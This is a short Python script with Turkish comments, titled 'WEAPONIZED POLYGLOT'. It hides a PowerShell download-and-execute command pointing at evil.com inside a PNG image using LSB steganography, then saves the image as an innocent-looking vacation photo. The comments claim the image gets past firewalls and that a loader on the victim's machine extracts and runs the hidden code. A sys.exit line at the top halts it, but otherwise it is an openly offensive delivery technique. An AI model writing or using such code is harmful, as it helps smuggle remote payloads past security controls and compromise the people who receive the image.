import sys
from stegano import lsb

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Resim dosyası içine zararlı kod gömer.")

print("--- WEAPONIZED POLYGLOT ---")

def embed_malware():
    # 1. ZARARLI PAYLOAD (Weaponized Part)
    # Simülasyonda: "Bu bir gizli mesajdır"
    # Gerçekte: Antivirüsün metin sanacağı ama aslında kod olan string.
    
    # Powershell komutu: İnternetten EXE indir ve çalıştır.
    payload = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
    
    print("[*] Payload resme enjekte ediliyor (LSB Tekniği)...")
    
    # Resmi piksellerin en önemsiz bitlerine (Least Significant Bit) sakla
    secret_image = lsb.hide("masum_manzara.png", payload)
    secret_image.save("tatil_fotografi.png")
    
    print("💀 OLUŞTURULDU: tatil_fotografi.png")
    print("Bu resim Firewall'dan geçer. Karşı tarafta bir 'Loader' scripti içindeki kodu çıkarıp çalıştırır.")

if __name__ == "__main__":
    embed_malware()